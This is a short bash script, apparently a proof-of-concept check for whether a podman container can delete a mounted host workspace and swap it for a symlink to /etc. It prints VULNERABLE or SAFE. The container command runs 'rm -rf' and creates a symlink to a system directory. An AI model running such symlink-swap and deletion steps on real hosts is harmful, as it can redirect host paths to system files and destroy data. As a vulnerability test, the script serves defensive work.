#!/bin/bash
TMP_WORKSPACE=$(mktemp -d)

# Start podman container that tries to delete the workspace and replace it with a symlink
podman run --rm -v "$TMP_WORKSPACE:$TMP_WORKSPACE:Z" alpine sh -c "rm -rf $TMP_WORKSPACE && ln -s /etc $TMP_WORKSPACE"

# Check if the symlink was created
if [ -L "$TMP_WORKSPACE" ]; then
    echo "VULNERABLE! Attacker replaced workspace with a symlink!"
else
    echo "SAFE. Workspace is still a directory."
fi

rm -rf "$TMP_WORKSPACE"
